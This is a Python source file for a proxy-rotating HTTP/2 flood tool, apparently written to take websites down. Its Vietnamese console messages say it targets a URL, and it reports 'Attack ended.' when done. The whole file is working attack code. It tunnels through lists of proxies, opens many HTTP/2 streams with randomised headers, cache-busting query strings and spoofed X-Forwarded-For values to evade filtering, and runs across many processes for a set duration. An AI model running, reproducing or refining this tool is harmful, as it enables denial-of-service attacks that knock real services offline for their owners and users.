# ddos_http2_full_research.py

import os
import sys
import time
import ssl
import socket
import random
import threading
import multiprocessing
import http.client
import platform
import psutil
from urllib.parse import urlparse
from h2.connection import H2Connection
from h2.config import H2Configuration

# ==== CONFIG ====
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/pdf;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xhtml+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-apple-plist+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/svg+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/javascript;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ecmascript;q=0.9"
]
CACHE_HEADERS = [
    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0',
    'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0',
    'no-cache, no-store, private, s-maxage=0, max-age=0, must-revalidate, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, proxy-revalidate',
    'private, no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, immutable',
    'no-cache, no-store, must-revalidate, max-age=0, private, proxy-revalidate, must-understand',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, pre-check=0, post-check=0'
]
LANG_HEADERS = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
]
ENCODING_HEADERS = [
    'gzip, deflate, br',
    'deflate, gzip',
    'gzip, identity',
    'gzip, compress, br',
    'identity, gzip, deflate',
    'gzip, deflate, zstd',
    'br, zstd, gzip',
    'gzip, deflate, br, lzma',
    'deflate, br, zstd, xpress',
    'gzip, deflate, xz',
    'gzip, zstd, snappy',
    'identity, *;q=0',
    'gzip, identity',
    'deflate, gzip',
    'compress, gzip',
    '*',
]
FETCH_SITE = ["same-origin", "same-site", "cross-site"]
FETCH_MODE = ["navigate", "same-origin", "no-cors", "cors"]
FETCH_DEST = ["document", "sharedworker", "worker"]

CP_LIST = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
]

SIGALGS = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
]

SYSTEM_OS = [
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703",
]
ARCHS = [
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium",
]
WINDOWS_VERS = [
    "2012 R2",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008",
]

MAX_RAM_PERCENT = 80
RESTART_DELAY = 1

def super_ultra_random(max_val: int) -> int:
    import hashlib
    seed1 = os.urandom(32).hex()
    seed2 = os.urandom(32).hex()
    combined = seed1 + seed2
    h = hashlib.sha512(combined.encode()).hexdigest()
    return int(h[:8], 16) % max_val

def read_lines(path):
    with open(path, "r") as f:
        proxies = []
        for line in f:
            clean = line.strip().replace("socks5://", "")
            if clean.count(":") == 1:
                proxies.append(clean)
        return proxies


def randstr(length):
    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=length))

def random_header_set(parsed_url, proxy_ip):
    return {
        ":authority": parsed_url.netloc,
        ":scheme": "https",
        ":method": "GET",
        ":path": parsed_url.path + f"?{randstr(5)}={randstr(10)}",
        "user-agent": f"Mozilla/5.0 ({random.choice(SYSTEM_OS)}; {random.choice(WINDOWS_VERS)}; {random.choice(ARCHS)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.{randstr(3)}.59 Safari/537.36",
        "accept": random.choice(ACCEPT_HEADERS),
        "accept-encoding": random.choice(ENCODING_HEADERS),
        "accept-language": random.choice(LANG_HEADERS),
        "cache-control": random.choice(CACHE_HEADERS),
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "sec-fetch-site": random.choice(FETCH_SITE),
        "sec-fetch-mode": random.choice(FETCH_MODE),
        "sec-fetch-dest": random.choice(FETCH_DEST),
        "x-forwarded-for": proxy_ip,
        "NEL": '{"report_to":"default","max_age":2592000,"include_subdomains":true}'
    }

def connect_proxy_tls(proxy_host, proxy_port, target_host, target_port):
    try:
        sock = socket.create_connection((proxy_host, int(proxy_port)))
        connect_cmd = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}\r\nConnection: keep-alive\r\n\r\n"
        sock.sendall(connect_cmd.encode())
        if b"200" not in sock.recv(4096):
            sock.close()
            return None
        context = ssl.create_default_context()
        context.set_alpn_protocols(["h2"])
        tls_sock = context.wrap_socket(sock, server_hostname=target_host)
        return tls_sock
    except:
        return None

def send_http2(tls_sock, parsed_url, proxy_ip, rate, duration):
    config = H2Configuration(client_side=True, header_encoding='utf-8')
    conn = H2Connection(config=config)
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())
    end_time = time.time() + duration

    while time.time() < end_time:
        for _ in range(rate):
            headers = list(random_header_set(parsed_url, proxy_ip).items())
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=True)
        try:
            tls_sock.sendall(conn.data_to_send())
        except:
            break
        time.sleep(0.3)

def worker(proxy_list, parsed_url, rate, duration):
    while True:
        proxy = random.choice(proxy_list)
        if proxy.count(":") != 1:
            continue
        proxy_ip, proxy_port = proxy.split(":")
        target_port = 443 if parsed_url.scheme == "https" else 80

        print(f"[Thread {multiprocessing.current_process().name}] Kết nối {proxy_ip}:{proxy_port}...")

        tls_sock = connect_proxy_tls(proxy_ip, proxy_port, parsed_url.hostname, target_port)
        if tls_sock:
            try:
                print(f"[✓] Proxy hoạt động: {proxy_ip}:{proxy_port}")
                send_http2(tls_sock, parsed_url, proxy_ip, rate, duration)
            except Exception as e:
                print(f"[!] Lỗi gửi HTTP/2: {e}")
            finally:
                tls_sock.close()
        else:
            print(f"[✗] Proxy lỗi: {proxy_ip}:{proxy_port}")


def monitor_ram_and_restart(children):
    while True:
        ram = psutil.virtual_memory().percent
        if ram >= MAX_RAM_PERCENT:
            print(f"[!] RAM Usage High ({ram:.2f}%) - Restarting workers...")
            for p in children:
                p.terminate()
            time.sleep(RESTART_DELAY)
            break
        time.sleep(5)

def main():
    if len(sys.argv) < 6:
        print("Usage: python ddos_http2_full_research.py <url> <time_sec> <rate> <threads> <proxy_file>")
        sys.exit(1)

    url, duration, rate, threads, proxy_file = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), sys.argv[5]
    parsed_url = urlparse(url)
    proxies = read_lines(proxy_file)

    if len(proxies) == 0:
        print("[❌] Không có proxy hợp lệ trong file. Kiểm tra lại định dạng!")
        sys.exit(1)

    print(f"\n[+] Target    : {parsed_url.netloc}")
    print(f"[+] Duration  : {duration}s")
    print(f"[+] Rate      : {rate} req/thread/s")
    print(f"[+] Threads   : {threads}")
    print(f"[+] Proxies   : {len(proxies)}\n")

    workers = []
    for _ in range(threads):
        p = multiprocessing.Process(target=worker, args=(proxies, parsed_url, rate, duration))
        p.start()
        workers.append(p)


    time.sleep(duration)

    for p in workers:
        p.terminate()

    print("[✓] Attack ended.")


if __name__ == "__main__":
    main()